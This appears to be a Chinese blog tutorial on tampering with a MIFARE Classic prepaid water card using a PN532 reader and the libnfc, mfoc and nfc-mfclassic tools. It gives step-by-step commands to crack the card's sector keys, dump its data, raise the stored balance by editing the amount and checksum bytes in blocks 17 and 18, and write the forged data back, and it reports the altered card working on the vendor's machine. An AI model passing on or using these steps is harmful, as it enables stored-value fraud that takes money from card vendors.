## 0x01买板子
最便宜的板子pn532，需要买usb转串口的设备，对于kali-rolling，好像是通杀的，无论是PL2303,ch34X,FT232RL(没测试，这个更高端应该没问题)，cp2102。
把排针焊接到pn532上，用杜邦线将两个板子连接,hardware is ok.

## 0x02安装软件
需要安装libnfc，可到github上下载，地址：https://github.com/nfc-tools/libnfc，解压后

```
cd xxx
./configure
make
sudo make install 
```
注：新版的要用automake工具

新建`/usr/local/etc/nfc/libnfc.conf `
```
abc@kali:/usr/local/etc/nfc$ cat libnfc.conf 
#allow_autoscan = true
device.connstring = "pn532_uart:/dev/ttyUSB0"
```
安装mfoc、mfcuk，好像要编译下，因kali自带，这里不再说明。

## 0x03开始
连接设备，开工，拿水卡试下
``` 
abc@kali:~$ sudo nfc-list
nfc-list uses libnfc 1.7.1
NFC device: pn532_uart:/dev/ttyUSB0 opened
1 ISO14443A passive target(s) found:
ISO/IEC 14443A (106 kbps) target:
    ATQA (SENS_RES): 00  04  
       UID (NFCID1): 71  3d  b3  1e  
      SAK (SEL_RES): 08  
```
可以识别, 安装正确. 
解码
```
abc@kali:~/nfc$ mfoc -f key -O tmp.mfd
...
Auth with all sectors succeeded, dumping keys to a file!
...
```
搞定密码
注：在安装libnfc时若是用到sudo，则相应命令也要root权限来执行

## 0x04分析数据
这里的数据较为简单, bock17和18储存金额和校验位, 找到校验位的规律为循环出现, 因此, 基于原有数据, 如00 00对应5a 78, 金额加上1020, 得到10 20对应FC 03, 修改结束.
注：金额数据是逆序存放，反过来读

写入到原卡或者空白卡片
```
abc@kali:~/nfc$ nfc-mfclassic w b tmp.mfd tmp.mfd
```
nfc-mfclassic命令查看help可更清楚每个参数的作用，这里不再展开

## 0x05测试
测试, 拿到卡机上测试,发现无法读取, 回到0x04, 将校验位加减1,重新写入, 测试ok.
